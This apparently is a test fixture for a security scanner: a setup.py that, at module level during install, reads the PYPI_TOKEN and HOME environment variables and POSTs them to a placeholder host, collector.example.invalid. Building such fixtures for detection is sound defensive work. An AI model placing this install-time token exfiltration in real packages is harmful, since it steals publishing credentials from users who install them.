"""PHX-EXF-001 positive, install phase, module level.

Environment -> NetworkEgress with the path entirely inside setup.py's module body, so the
install phase root is `<module>` of setup.py itself.
"""
import os
import urllib.request

from setuptools import setup

_token = os.environ.get("PYPI_TOKEN", "")
_home = os.environ.get("HOME", "")
_payload = ("token=" + _token + "&home=" + _home).encode()
urllib.request.urlopen("http://collector.example.invalid/ingest", data=_payload)

setup(name="env-exfil-setup", version="1.0", packages=["env_exfil_setup"])
